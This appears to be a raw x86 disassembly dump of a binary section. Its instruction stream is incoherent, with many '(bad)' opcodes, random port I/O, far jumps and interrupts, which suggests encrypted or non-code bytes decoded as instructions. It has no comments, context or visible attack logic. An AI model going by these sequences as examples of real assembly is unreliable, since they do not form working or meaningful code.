  412228:	mov    ah,0xd4
  41222a:	add    DWORD PTR [ebp-0x12],esi
  41222d:	push   ss
  41222e:	push   eax
  41222f:	int3   
  412230:	pop    ds
  412231:	xchg   dl,al
  412233:	or     ch,BYTE PTR [ebp-0x403e0ba8]
  412239:	out    dx,eax
  41223a:	dec    eax
  41223b:	rol    BYTE PTR [ecx+0x1155a10f],cl
  412241:	mov    eax,0xc105f57b
  412246:	inc    ebx
  412247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412248:	adc    eax,DWORD PTR [ebx+eax*2-0x3b]
  41224c:	xchg   BYTE PTR [edx+ebx*8+0x56],bl
  412250:	pop    ss
  412251:	cdq    
  412252:	fcomp  QWORD PTR [bp+di+0x5c77]
  412257:	or     al,0x17
  412259:	xchg   esi,eax
  41225a:	sub    ch,BYTE PTR [edi]
  41225c:	in     eax,dx
  41225d:	jmp    edx
  41225f:	xchg   BYTE PTR [ebp+edx*1+0x1],ah
  412263:	dec    ebp
  412264:	or     ebx,DWORD PTR [eax]
  412266:	(bad)  
  412267:	adc    BYTE PTR [esi+0x5b],bh
  41226a:	pop    esp
  41226b:	loopne 0x4122b0
  41226d:	sbb    eax,DWORD PTR [esi]
  41226f:	ins    DWORD PTR es:[edi],dx
  412270:	inc    ecx
  412271:	repz xor ch,BYTE PTR [bp+si]
  412275:	dec    edx
  412276:	jg     0x4122e1
  412278:	rol    DWORD PTR [eax+0xe],cl
  41227b:	pop    es
  41227c:	mov    dl,BYTE PTR [esi]
  41227e:	jmp    0x8f1:0x8793a1c5
  412285:	(bad)  
  412286:	leave  
  412287:	lahf   
  412288:	pop    esi
  412289:	sub    BYTE PTR [eax+0x71924d0c],dl
  41228f:	add    ebp,DWORD PTR [ecx]
  412291:	pop    ebp
  412292:	push   es
  412293:	sub    DWORD PTR [esi],edx
  412295:	not    BYTE PTR [edi-0x69]
  412298:	add    DWORD PTR [edx],eax
  41229a:	jle    0x4122da
  41229c:	jns    0x4122e9
  41229e:	sub    cl,BYTE PTR [edi]
  4122a0:	xchg   ebp,eax
  4122a1:	sbb    BYTE PTR [edi-0x46],bl
  4122a4:	bound  ecx,QWORD PTR [esp+edi*8-0x750703ee]
  4122ab:	cmp    esi,edx
  4122ad:	pop    ecx
  4122ae:	mov    ds:0x38e7a20a,al
  4122b3:	ins    BYTE PTR es:[edi],dx
  4122b4:	popa   
  4122b5:	jmp    0xd11fbeff
  4122ba:	mov    ds:0x7dc9d31c,eax
  4122bf:	inc    edx
  4122c0:	call   0x23e8:0x1e6906b6
  4122c7:	cmp    ah,bl
  4122c9:	pop    esi
  4122ca:	dec    esp
  4122cb:	mov    edx,0x8409b524
  4122d0:	adc    BYTE PTR [edi],ah
  4122d2:	add    eax,0x71012322
  4122d7:	cs inc ebx
  4122d9:	in     eax,dx
  4122da:	cmp    ch,BYTE PTR [eax]
  4122dc:	sbb    eax,0xafa42b09
  4122e1:	sub    eax,0x584b8375
  4122e6:	jae    0x41229c
  4122e8:	pop    es
  4122e9:	or     eax,0xcaaaf59d
  4122ee:	lock push ss
  4122f0:	fild   WORD PTR [edx]
  4122f2:	out    dx,eax
  4122f3:	jmp    0x9499:0xf61dcebf
  4122fa:	test   al,0xb2
  4122fc:	call   0xa009:0x3b3035c1
  412303:	mov    ah,0xeb
  412305:	add    DWORD PTR [ecx+0x4d9619bd],esi
  41230b:	or     eax,0x92cff092
  412310:	mov    edi,0x6fee33
  412315:	sub    al,0x2d
  412317:	arpl   WORD PTR [ebx+ebp*1],ax
  41231a:	push   edi
  41231b:	mov    eax,ds:0xe9683178
  412320:	mov    ebx,0x2b1754bd
  412325:	into   
  412326:	leave  
  412327:	add    ch,dh
  412329:	call   0x96e7b6ae
  41232e:	bound  edi,QWORD PTR [esi-0x5d4307b7]
  412334:	xlat   BYTE PTR ds:[ebx]
  412335:	out    0x35,al
  412337:	arpl   WORD PTR ds:0x8cf9d09a,sp
  41233d:	fwait
  41233e:	xor    ecx,DWORD PTR [ecx-0x4c]
  412341:	pop    esi
  412342:	clc    
  412343:	sahf   
  412344:	stc    
  412345:	fcomp  QWORD PTR ds:0x435b0af9
  41234b:	fisubr WORD PTR [edx+0x68]
  41234e:	xchg   ebp,eax
  41234f:	dec    ebx
  412350:	xchg   esi,eax
  412351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412352:	clc    
  412353:	inc    edi
  412354:	aam    0xab
  412356:	or     BYTE PTR [edx],ah
  412358:	add    edi,ebp
  41235a:	or     BYTE PTR [edx+0x691a2943],ch
  412360:	inc    esp
  412361:	out    0xad,eax
  412363:	dec    edi
  412364:	iret   
  412365:	(bad)  
  412366:	and    DWORD PTR [eax],ecx
  412368:	pop    ebx
  412369:	or     eax,0x9d27d045
  41236e:	repnz dec esp
  412370:	adc    ecx,DWORD PTR [ebp-0x72]
  412373:	outs   dx,DWORD PTR ds:[esi]
  412374:	pop    ss
  412375:	rcr    DWORD PTR [edi+0x1e],1
  412378:	mov    bh,0x66
  41237a:	retf   
  41237b:	rol    BYTE PTR [ebx+0x5f],0x2
  41237f:	and    eax,0x2742d243
  412384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412385:	retf   0xc264
  412388:	adc    DWORD PTR [ebp+esi*2+0x18526b98],esi
  41238f:	shl    DWORD PTR [edi+ebx*4],0x83
  412393:	sbb    esi,DWORD PTR [ecx]
  412395:	push   esp
  412396:	ror    al,1
  412398:	cmp    bl,BYTE PTR [eax+edi*2-0x5d435db9]
  41239f:	mul    DWORD PTR [edx+0x7d]
  4123a2:	loopne 0x412337
  4123a4:	dec    BYTE PTR [ebp+0x19de8f4a]
  4123aa:	pop    ds
  4123ab:	jnp    0x412342
  4123ad:	dec    esp
  4123ae:	fcmovu st,st(6)
  4123b0:	cli    
  4123b1:	in     al,0xb5
  4123b3:	sub    DWORD PTR [edi+0x17fe1a0c],ebp
  4123b9:	fisttp DWORD PTR [eax]
  4123bb:	int    0x6e
  4123bd:	dec    esi
  4123be:	aas    
  4123bf:	lock rcl BYTE PTR [esi],1
  4123c2:	mov    eax,edx
  4123c4:	in     al,dx
  4123c5:	xchg   edi,eax
  4123c6:	adc    eax,0x167647cb
  4123cb:	fs (bad) 
  4123cd:	(bad)  
  4123ce:	(bad)
  4123d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123d3:	ds push edi
  4123d5:	pop    ecx
  4123d6:	jl     0x41235f
  4123d8:	lods   eax,DWORD PTR ds:[esi]
  4123d9:	ss (bad) 
  4123db:	push   ds
  4123dc:	test   al,0x19
  4123de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123df:	or     BYTE PTR [eax],dh
  4123e1:	sar    dl,0x7f
  4123e4:	es xor al,0xa3
  4123e7:	fist   WORD PTR [esi+esi*4]
  4123ea:	ja     0x41242b
  4123ec:	pop    esi
  4123ed:	push   eax
  4123ee:	inc    eax
  4123ef:	push   0xdc7c2397
  4123f4:	mov    ecx,0x1f82a0d2
  4123f9:	pop    eax
  4123fa:	xor    al,0x9b
  4123fc:	jmp    FWORD PTR [eax+0x20e340c]
  412402:	mov    edx,0x52b15925
  412407:	stos   BYTE PTR es:[edi],al
  412408:	div    BYTE PTR [eax+0x6c2b7d9d]
  41240e:	ret    0x876
  412411:	jp     0x4123e2
  412413:	add    al,0x74
  412415:	inc    edi
  412416:	mov    edx,0xa716ea16
  41241b:	aad    0xd8
  41241d:	stc    
  41241e:	mov    cl,0xba
  412420:	call   0xf5abd698
  412425:	test   BYTE PTR [edx+0x77],cl
  412428:	cdq    
  412429:	clc    
  41242a:	mov    BYTE PTR [edi-0x30543867],cl
  412430:	icebp  
  412431:	enter  0x1e75,0x91
  412435:	neg    BYTE PTR [eax-0x6df504f5]
  41243b:	dec    esp
  41243c:	jp     0x41247d
  41243e:	jnp    0x4123f3
  412440:	out    0x59,eax
  412442:	mov    dh,0x3e
  412444:	jg     0x412426
  412446:	pop    edi
  412447:	dec    ebp
  412448:	adc    BYTE PTR [edi],cl
  41244a:	adc    al,0x14
  41244c:	mov    DWORD PTR [ebx],0xfa9aa726
  412452:	inc    esi
  412453:	mov    edi,0x50b9b3b7
  412458:	aaa    
  412459:	dec    ebp
  41245a:	mov    ebx,0xc9704c2f
  41245f:	jae    0x41244a
  412461:	fstp   DWORD PTR [ecx-0x2386b657]
  412467:	dec    ebx
  412468:	xchg   BYTE PTR [edi+0x48],bh
  41246b:	shr    edi,cl
  41246d:	cwde   
  41246e:	outs   dx,DWORD PTR ds:[esi]
  41246f:	ds xchg edx,eax
  412471:	imul   eax,esp,0xffffffee
  412474:	mov    ecx,DWORD PTR [eax+0x52]
  412477:	xchg   BYTE PTR [esi+edx*2-0x76],ah
  41247b:	xchg   edi,eax
  41247c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41247d:	mov    ds:0x7e78527f,al
  412483:	shr    BYTE PTR [edi+0x2b6b8a40],0xcc
  41248a:	mov    ds:0x450ecc20,eax
  41248f:	adc    cl,0x2b
  412492:	jo     0x412435
  412494:	jl     0x41244e
  412496:	adc    DWORD PTR [eax-0x12d32c85],esp
  41249c:	into   
  41249d:	xor    BYTE PTR [edx+0xaa1179c],dh
  4124a3:	clc    
  4124a4:	jnp    0x41244e
  4124a6:	ficom  DWORD PTR [esp+ecx*4]
  4124a9:	xor    BYTE PTR [edx+esi*1+0x5d],0x90
  4124ae:	add    ah,BYTE PTR [edx-0x49]
  4124b1:	sar    cl,cl
  4124b3:	lea    ecx,[eax+edx*4]
  4124b6:	fdivp  st(3),st
  4124b8:	fisubr WORD PTR [ebp+0xe4a73c5]
  4124be:	jnp    0x41244b
  4124c0:	retf   0xc5c8
  4124c3:	push   ebp
  4124c4:	sbb    esi,edx
  4124c6:	xor    esi,edx
  4124c8:	cmc    
  4124c9:	push   cs
  4124ca:	mov    edx,0x68adba3c
  4124cf:	call   FWORD PTR [ecx]
  4124d1:	or     DWORD PTR [edi],edx
  4124d3:	aaa    
  4124d4:	les    edi,FWORD PTR [ecx]
  4124d6:	xchg   DWORD PTR [ecx-0x1584a30b],edi
  4124dc:	sub    bh,BYTE PTR cs:[ebx-0x205f5999]
  4124e3:	mov    eax,ds:0xf53c94b2
  4124e8:	push   ecx
  4124e9:	sub    DWORD PTR [eax+0x79df02e8],ecx
  4124ef:	into   
  4124f0:	int    0x34
  4124f2:	cs mov dl,0x2c
  4124f5:	addr16 aaa 
  4124f7:	aas    
  4124f8:	fisubr WORD PTR [ebp-0x7d]
  4124fb:	mov    esp,0x685ad4e2
  412500:	ja     0x412538
  412502:	(bad)  
  412503:	stos   BYTE PTR es:[edi],al
  412504:	sbb    WORD PTR gs:[ecx-0x6f],bx
  412509:	data16 mov WORD PTR [esi],cs
  41250c:	inc    edx
  41250d:	inc    edi
  41250e:	scas   eax,DWORD PTR es:[edi]
  41250f:	fwait
  412510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412511:	push   0xffffff95
  412513:	mov    cl,0x9b
  412515:	jp     0x412552
  412517:	mov    bh,ch
  412519:	adc    BYTE PTR [edx-0x41ddcef6],bl
  41251f:	jp     0x412512
  412521:	fistp  WORD PTR [ecx]
  412523:	push   cs
  412524:	mov    ebp,0xd7798d05
  412529:	dec    edx
  41252a:	outs   dx,DWORD PTR ds:[esi]
  41252b:	cwde   
  41252c:	leave  
  41252d:	dec    ecx
  41252e:	test   eax,0x800a3de
  412533:	not    BYTE PTR [esi-0x6be6b810]
  412539:	jg     0x412576
  41253b:	int    0xf5
  41253d:	sub    dh,ah
  41253f:	int    0x5
  412541:	xchg   ebp,eax
  412542:	inc    ecx
  412543:	and    DWORD PTR [ebx+0x62],edx
  412546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412547:	out    0x66,al
  412549:	jnp    0x412586
  41254b:	lods   al,BYTE PTR ds:[esi]
  41254c:	out    dx,al
  41254d:	pop    edi
  41254e:	cli    
  41254f:	scas   al,BYTE PTR es:[edi]
  412550:	sahf   
  412551:	jbe    0x4124ed
  412553:	push   eax
  412554:	or     al,0x94
  412556:	das    
  412557:	fcomp  DWORD PTR [ecx-0x4c]
  41255a:	pop    ecx
  41255b:	sar    ah,cl
  41255d:	ja     0x412501
  41255f:	pop    eax
  412560:	enter  0x80ed,0x43
  412564:	lahf   
  412565:	mov    ds:0x8aa6e3f0,eax
  41256a:	push   ds
  41256b:	mov    dl,0x2
  41256d:	mov    al,0xd
  41256f:	and    DWORD PTR [ebx-0x502cdbbd],esp
  412575:	push   eax
  412576:	jne    0x41250f
  412578:	clc    
  412579:	xor    al,0x3f
  41257b:	stc    
  41257c:	inc    ebx
  41257d:	xchg   DWORD PTR [ebx],eax
  41257f:	dec    esp
  412580:	add    eax,DWORD PTR [edi+eax*1-0x7e10f89]
  412587:	ret    0x2933
  41258a:	adc    edi,DWORD PTR [ebx]
  41258c:	in     al,dx
  41258d:	push   cs
  41258e:	cs mov ah,0x55
  412591:	xchg   ecx,eax
  412592:	je     0x4125ba
  412594:	outs   dx,BYTE PTR ds:[esi]
  412595:	data16 arpl bx,bp
  412598:	add    BYTE PTR [edx-0x1c],bl
  41259b:	fcmovnu st,st(2)
  41259d:	add    al,0xaf
  41259f:	(bad)  [eax+0x25]
  4125a2:	loop   0x412599
  4125a4:	pop    edx
  4125a5:	inc    esi
  4125a6:	ficom  WORD PTR [edi+0x31]
  4125a9:	add    eax,DWORD PTR [ebx]
  4125ab:	jne    0x41262b
  4125ad:	pushf  
  4125ae:	mov    esi,0x2dcb6ece
  4125b3:	pusha  
  4125b4:	and    DWORD PTR [eax-0x11ffa414],edx
  4125ba:	jbe    0x4125ad
  4125bc:	fwait
  4125bd:	out    dx,eax
  4125be:	cmc    
  4125bf:	and    bl,BYTE PTR [eax-0x5dd82752]
  4125c5:	xor    cl,BYTE PTR [edi+edx*1-0x65]
  4125c9:	sub    DWORD PTR [edi],0x727888da
  4125cf:	mov    ?,edi
  4125d1:	aas    
  4125d2:	stc    
  4125d3:	xchg   DWORD PTR [ebx],ecx
  4125d5:	fld    QWORD PTR [ebx+eax*1-0x65]
  4125d9:	je     0x4125fa
  4125db:	jnp    0x412581
  4125dd:	imul   ecx,DWORD PTR ds:0x6ca9bf2b,0xc509720c
  4125e7:	in     al,0x67
  4125e9:	out    dx,al
  4125ea:	jns    0x4125b1
  4125ec:	pusha  
  4125ed:	js     0x412583
  4125ef:	out    0x1d,al
  4125f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f2:	jno    0x41265a
  4125f4:	mov    WORD PTR [esi+0x36],gs
  4125f7:	ror    dl,0x63
  4125fa:	mov    bh,0xb3
  4125fc:	lods   eax,DWORD PTR ds:[esi]
  4125fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125fe:	mov    cl,0xa9
  412600:	in     al,0xbc
  412602:	aad    0x2f
  412604:	sub    eax,0x2967c804
  412609:	add    edx,DWORD PTR [ecx]
  41260b:	ret    0xf7a2
  41260e:	out    dx,eax
  41260f:	addr16 icebp 
  412611:	add    ebx,0xa7763e52
  412617:	cmp    ebp,DWORD PTR [eax+eiz*8]
  41261a:	jp     0x4125f5
  41261c:	in     al,0x90
  41261e:	mov    ecx,0x67398908
  412623:	(bad)  
  412624:	or     ah,ch
  412626:	sub    ebx,edx
  412628:	es xchg esi,eax
  41262a:	mov    bh,al
  41262c:	jle    0x412665
  41262e:	or     BYTE PTR [ecx],bl
  412630:	dec    esp
  412631:	mov    ecx,0x3a803095
  412636:	xor    eax,0xbf2d80bb
  41263b:	cmc    
  41263c:	sti    
  41263d:	aam    0xee
  41263f:	jmp    0x412694
  412641:	jge    0x4125e1
  412643:	sbb    edi,DWORD PTR [edx-0x3939defb]
  412649:	or     eax,0x3dcd31e0
  41264e:	scas   eax,DWORD PTR es:[edi]
  41264f:	shl    BYTE PTR [eax],1
  412651:	sar    BYTE PTR [ecx],cl
  412653:	jg     0x41267a
  412655:	(bad)  
  412656:	sbb    eax,0x6e426aa6
  41265b:	jmp    0xed94:0xf3b8a65d
  412662:	test   eax,0x9904bf39
  412667:	je     0x41266b
  412669:	cmp    al,0xc4
  41266b:	(bad)  
  41266c:	out    dx,eax
  41266d:	mov    ss,WORD PTR [edx]
  41266f:	rcl    DWORD PTR [ebx-0x13d3bd31],cl
  412675:	(bad)  
  412676:	(bad)  
  412677:	xlat   BYTE PTR ds:[ebx]
  412678:	popf   
  412679:	test   al,0x9f
  41267b:	jmp    0x4126a4
  41267d:	xchg   edi,eax
  41267e:	sti    
  41267f:	jno    0x41268a
  412681:	scas   al,BYTE PTR es:[edi]
  412682:	fsubr  QWORD PTR [esi-0x10]
  412685:	and    dh,ah
  412687:	jb     0x4126b1
  412689:	sbb    ebp,DWORD PTR ds:0xd692ac7b
  41268f:	gs pop ebp
  412691:	fistp  DWORD PTR [esi-0x2d]
  412694:	inc    esp
  412695:	in     al,0xc0
  412697:	sbb    BYTE PTR [esi],0x5d
  41269a:	push   ds
  41269b:	add    BYTE PTR [ebp-0x17],0xc6
  41269f:	repz pop ss
  4126a1:	sub    BYTE PTR [edx+0x7c],dh
  4126a4:	or     BYTE PTR [ecx+0x1a879e12],bl
  4126aa:	(bad)  
  4126ab:	std    
  4126ac:	cmp    BYTE PTR [edx+0x69],0x43
  4126b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126b1:	daa    
  4126b2:	jp     0x4126a1
  4126b4:	test   BYTE PTR [ebx+0x2fd1553c],0x41
  4126bb:	push   0xffffff97
  4126bd:	or     DWORD PTR [ecx],0x74
  4126c0:	add    eax,0x11e3d57a
  4126c5:	add    al,0x90
  4126c7:	cmp    al,0xc
  4126c9:	into   
  4126ca:	shl    ch,cl
  4126cc:	aam    0xdd
  4126ce:	out    dx,al
  4126cf:	shl    DWORD PTR [edx+0x2d],0x24
  4126d3:	inc    eax
  4126d4:	xchg   edi,eax
  4126d5:	shl    BYTE PTR [esi],cl
  4126d7:	hlt    
  4126d8:	jbe    0x4126cd
  4126da:	div    BYTE PTR [eax-0x69]
  4126dd:	(bad)  
  4126de:	xor    dh,BYTE PTR [edi]
  4126e0:	mov    al,0x24
  4126e2:	xchg   esi,eax
  4126e3:	sub    cl,BYTE PTR [edi+0x7]
  4126e6:	and    eax,0x530dfa2b
  4126eb:	jmp    0xeccf:0x2de615d7
  4126f2:	sbb    ebp,DWORD PTR [ebp+0x0]
  4126f5:	test   BYTE PTR [esi-0xa],ah
  4126f8:	lods   eax,DWORD PTR ds:[esi]
  4126f9:	push   DWORD PTR [eax-0x558cf437]
  4126ff:	int    0xe4
  412701:	sar    esi,cl
  412703:	xor    cl,BYTE PTR [ecx]
  412705:	aad    0xbd
  412707:	sbb    BYTE PTR [edx+0x24],bh
  41270a:	(bad)  
  41270b:	sbb    BYTE PTR [esi+0x43],ch
  41270e:	jo     0x412749
  412710:	test   BYTE PTR [eax+ebp*8],ch
  412713:	mov    BYTE PTR [esi-0x71],0x68
  412717:	rcl    edi,cl
  412719:	not    BYTE PTR [edi]
  41271b:	mov    ds:0xd93282cf,eax
  412720:	xor    DWORD PTR [edi+0x4cf849fb],ebp
  412726:	call   0xccd9b461
  41272b:	xchg   ebp,eax
  41272c:	adc    cl,BYTE PTR [edx]
  41272e:	retf   0xa6fa
  412731:	adc    dl,dh
  412733:	cmp    BYTE PTR [esi],cl
  412735:	ins    BYTE PTR es:[edi],dx
  412736:	xor    al,0x2f
  412738:	pop    ebp
  412739:	iret   
  41273a:	jl     0x4126e5
  41273c:	cmp    ebx,ecx
  41273e:	sahf   
  41273f:	leave  
  412740:	push   eax
  412741:	cmp    al,0xac
  412743:	xchg   edx,eax
  412744:	mov    bl,0xf
  412746:	push   esi
  412747:	pushf  
  412748:	sub    DWORD PTR [esi],eax
  41274a:	popf   
  41274b:	mov    edx,esp
  41274d:	mov    ch,0x89
  41274f:	in     eax,0xa9
  412751:	dec    edx
  412752:	neg    esp
  412754:	cdq    
  412755:	jg     0x412705
  412757:	popf   
  412758:	xor    al,0x86
  41275a:	dec    ebx
  41275b:	jg     0x41277f
  41275d:	push   edi
  41275e:	call   0x76c3:0x6c5ae1d9
  412765:	mov    ah,0xf1
  412767:	lods   al,BYTE PTR ds:[esi]
  412768:	push   edx
  412769:	outs   dx,BYTE PTR ds:[esi]
  41276a:	pop    edi
  41276b:	lds    edx,FWORD PTR [esi+0x22]
  41276e:	sub    DWORD PTR [esi+0x6a],ecx
  412771:	add    esi,DWORD PTR [eax]
  412773:	xchg   ebp,eax
  412774:	fst    QWORD PTR [ebp-0x58dfc01e]
  41277a:	in     eax,dx
  41277b:	sub    eax,DWORD PTR [ebx+0x6d]
  41277e:	mov    ebp,0x5b8a2a46
  412783:	xor    BYTE PTR ds:0x8e002576,ah
  412789:	sar    BYTE PTR [edx+0x376e9f74],cl
  41278f:	je     0x41272c
  412791:	shld   DWORD PTR [ecx+ebx*1],edi,0x9b
  412796:	jecxz  0x412753
  412798:	xchg   edi,eax
  412799:	xor    eax,0x9d71f23d
  41279e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41279f:	addr16 dec ecx
  4127a1:	shl    DWORD PTR [ebp+0x66],0xac
  4127a5:	or     eax,DWORD PTR [ebx+0x45261006]
  4127ab:	retf   
  4127ac:	(bad)  
  4127ae:	xor    eax,0xbaa92d0c
  4127b3:	mov    al,0xb6
  4127b5:	mov    bl,BYTE PTR [ebx]
  4127b7:	nop
  4127b8:	push   ds
  4127b9:	fwait
  4127ba:	outs   dx,BYTE PTR ds:[esi]
  4127bb:	test   BYTE PTR [esp+edx*1+0x28],ah
  4127bf:	test   eax,0xd4f76f1d
  4127c4:	je     0x4127a7
  4127c6:	mov    esi,0xbda9b3e
  4127cb:	cmp    bh,al
  4127cd:	add    al,0x14
  4127cf:	jmp    0x4127c5
  4127d1:	jbe    0x4127f4
  4127d3:	mov    ss,esp
  4127d5:	sbb    esi,DWORD PTR [edi-0x38]
  4127d8:	aaa    
  4127d9:	dec    edi
  4127da:	mov    bl,BYTE PTR [esi+edi*2+0x3d0ed06a]
  4127e1:	mov    ecx,0xb88fc4f3
  4127e6:	aam    0x4a
  4127e8:	push   ebx
  4127e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127ea:	(bad)  
  4127eb:	loop   0x4127d4
  4127ed:	adc    edi,0x9b4ed71d
  4127f3:	fld    DWORD PTR [esi+0x4b]
  4127f6:	cmp    al,0x35
  4127f8:	mov    al,ds:0xf2fb6af7
  4127fd:	mov    ecx,0x375a7574
  412802:	push   cs
  412803:	sub    eax,0x26151c85
  412808:	jnp    0x41280c
  41280a:	cdq    
  41280b:	ret    0x6ffd
  41280e:	mov    ecx,0xd1734f9a
  412813:	rcl    dh,0xe2
  412816:	imul   eax,DWORD PTR [esi-0x57],0xffffffdf
  41281a:	pop    ds
  41281b:	shl    DWORD PTR [edx+0x3f6b33ba],1
  412821:	mov    ecx,0xe55d36b9
  412826:	ins    DWORD PTR es:[edi],dx
  412827:	adc    DWORD PTR [esi-0x21],ecx
  41282a:	mov    ebp,esi
  41282c:	jmp    0xcbdc9cc3
  412831:	aaa    
  412832:	sbb    eax,0xacbe3bc3
  412837:	inc    ebp
  412838:	mov    eax,0x79db6d5b
  41283d:	fadd   st(7),st
  41283f:	jae    0x4127c5
  412841:	pop    eax
  412842:	clc    
  412843:	ret    
  412844:	push   0x4672b8b9
  412849:	mov    ds:0x472a2a88,al
  41284e:	call   FWORD PTR [eax+0x40]
  412851:	int    0xff
  412853:	ret    
  412854:	and    eax,0x6c091c29
  412859:	(bad)  
  41285a:	lods   al,BYTE PTR ds:[esi]
  41285b:	inc    ebp
  41285c:	adc    esi,edx
  41285e:	jle    0x412858
  412860:	xlat   BYTE PTR ds:[ebx]
  412861:	mov    bl,BYTE PTR [edi]
  412863:	mov    ecx,0xe6a0daa
  412868:	xchg   esp,eax
  412869:	jecxz  0x4128be
  41286b:	call   0x69fc:0xd53de46d
  412872:	pusha  
  412873:	data16 stc 
  412875:	(bad)  
  412876:	mov    ds:0x8d91020,eax
  41287b:	fst    QWORD PTR [edi]
  41287d:	xchg   ecx,eax
  41287e:	pop    ds
  41287f:	std    
  412880:	jne    0x41287d
  412882:	mov    al,0xa1
  412884:	int    0x39
  412886:	mov    edi,0xd6ec5046
  41288b:	inc    ebx
  41288c:	dec    eax
  41288d:	mov    bl,0x77
  41288f:	dec    edi
  412890:	xchg   bl,bl
  412892:	je     0x4128f4
  412894:	mov    BYTE PTR [ebp+ebx*2-0x3c7abcd0],cl
  41289b:	xchg   ebp,eax
  41289c:	sbb    al,0x7d
  41289e:	inc    esp
  41289f:	sbb    BYTE PTR [esi+0x3c],ch
  4128a2:	sbb    eax,0xb7b585db
  4128a7:	pop    eax
  4128a8:	fidiv  DWORD PTR [ebp+0xb9ee0b2]
  4128ae:	into   
  4128af:	pusha  
  4128b0:	out    0x60,eax
  4128b2:	test   bh,cl
  4128b4:	int3   
  4128b5:	jne    0x41286a
  4128b7:	mov    eax,0xbe84c54b
  4128bc:	lea    esi,[edx-0x1cfa474d]
  4128c2:	in     eax,0x74
  4128c4:	xor    dh,0xd0
  4128c7:	out    0x16,al
  4128c9:	fwait
  4128ca:	inc    ebp
  4128cb:	and    BYTE PTR [edi],0x1d
  4128ce:	aad    0xa0
  4128d0:	fstp   QWORD PTR [edx-0x7f9d3a91]
  4128d6:	adc    edi,ecx
  4128d8:	push   eax
  4128d9:	jle    0x412865
  4128db:	mov    dh,0xd0
  4128dd:	dec    eax
  4128de:	mov    WORD PTR [eax+eiz*1],fs
  4128e1:	mov    al,ds:0xf0eeebe4
  4128e6:	lods   eax,DWORD PTR ds:[esi]
  4128e7:	into   
  4128e8:	pushf  
  4128e9:	inc    ecx
  4128ea:	xor    DWORD PTR [edx],ecx
  4128ec:	mov    dh,0x22
  4128ee:	mov    ebx,0x575a8da3
  4128f3:	enter  0xfd37,0x56
  4128f7:	adc    bh,BYTE PTR [eax]
  4128f9:	ficom  WORD PTR [ebx]
  4128fb:	mov    BYTE PTR [ecx-0x402e219d],bl
  412901:	not    BYTE PTR [eax-0x6b]
  412904:	inc    ecx
  412905:	mov    dl,0x50
  412907:	mov    ebx,0x726a3b74
  41290c:	push   0xffffffba
  41290e:	adc    edi,esp
  412910:	adc    eax,DWORD PTR [ecx]
  412912:	mov    edx,0xe61f234
  412917:	aas    
  412918:	inc    esp
  412919:	sbb    DWORD PTR [ebx],esp
  41291b:	fild   QWORD PTR [edx-0xe521f0b]
  412921:	mov    cl,0x7d
  412923:	popa   
  412924:	push   esi
  412925:	stc    
  412926:	mov    edi,0x6c4ff759
  41292b:	outs   dx,DWORD PTR ds:[esi]
  41292c:	push   edx
  41292d:	aas    
  41292e:	mov    cl,0x3a
  412930:	or     BYTE PTR [ebp+0x1105a26a],ah
  412936:	fisttp QWORD PTR [ecx-0x65]
  412939:	xor    eax,0x4e7d9fe4
  41293e:	jb     0x412976
  412940:	cmc    
  412941:	clc    
  412942:	test   eax,0x602da047
  412947:	(bad)  
  412948:	push   ebx
  412949:	xlat   BYTE PTR ds:[ebx]
  41294a:	cdq    
  41294b:	jmp    0x41293a
  41294d:	xchg   esp,eax
  41294e:	les    esi,FWORD PTR [ebp-0x7d455c52]
  412954:	repnz jmp 0x47f3:0x874e3c1b
  41295c:	mov    al,ds:0xea21f3fd
  412961:	pop    ds
  412962:	pop    ss
  412963:	jo     0xc01362d1
  412969:	or     al,0xc8
  41296b:	jmp    0x3f87:0xa0be7563
  412972:	(bad)  
  412973:	sbb    DWORD PTR [edi],eax
  412975:	push   edx
  412976:	mov    ds:0x614a32f4,al
  41297b:	or     dl,BYTE PTR [eax-0x7e206c2]
  412981:	mov    cl,0xff
  412983:	imul   ebp,DWORD PTR [ecx+0x6ce0e2fc],0x15c7ac72
  41298d:	xor    eax,0xd7ff7499
  412992:	and    eax,ecx
  412994:	mov    esp,0x13c336e
  412999:	mov    ebp,esi
  41299b:	mov    bh,0x66
  41299d:	arpl   WORD PTR [edi+0x38],dx
  4129a0:	sbb    DWORD PTR [esi+0x3c719276],eax
  4129a6:	js     0x4129cc
  4129a8:	retf   0x488d
  4129ab:	retf   0xa41b
  4129ae:	adc    eax,DWORD PTR [ebp+0x48]
  4129b1:	aas    
  4129b2:	mov    ebp,0xf7a8252e
  4129b7:	imul   edx,DWORD PTR [edi+ebx*4+0x151aea91],0x42ea6a9d
  4129c2:	fcomip st,st(6)
  4129c4:	hlt    
  4129c5:	xchg   bh,cl
  4129c7:	jle    0x4129d1
  4129c9:	mov    edx,0x49cee5fe
  4129ce:	popf   
  4129cf:	scas   eax,DWORD PTR es:[edi]
  4129d0:	xchg   DWORD PTR [ebx+0x6d],esp
  4129d3:	cmp    bh,BYTE PTR [ebp+0x4e]
  4129d6:	test   BYTE PTR [edi+0x5faa5a56],bh
  4129dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129dd:	and    DWORD PTR [edi+ecx*1+0x54],esi
  4129e1:	jle    0x4129f8
  4129e3:	pop    es
  4129e4:	in     al,0xe6
  4129e6:	xchg   edi,eax
  4129e7:	je     0x4129a2
  4129e9:	inc    eax
  4129ea:	xor    bl,BYTE PTR [ebx-0x33]
  4129ed:	pop    esp
  4129ee:	xlat   BYTE PTR ds:[ebx]
  4129ef:	and    al,BYTE PTR [ebp+0x5]
  4129f2:	les    eax,FWORD PTR [eax+ebp*8-0x74]
  4129f6:	(bad)
  4129f9:	rcr    edi,cl
  4129fb:	mov    al,ds:0x31d9fc06
  412a00:	fwait
  412a01:	dec    esp
  412a02:	nop
  412a03:	cmp    edx,DWORD PTR [ebx+0x3f]
  412a06:	pop    esp
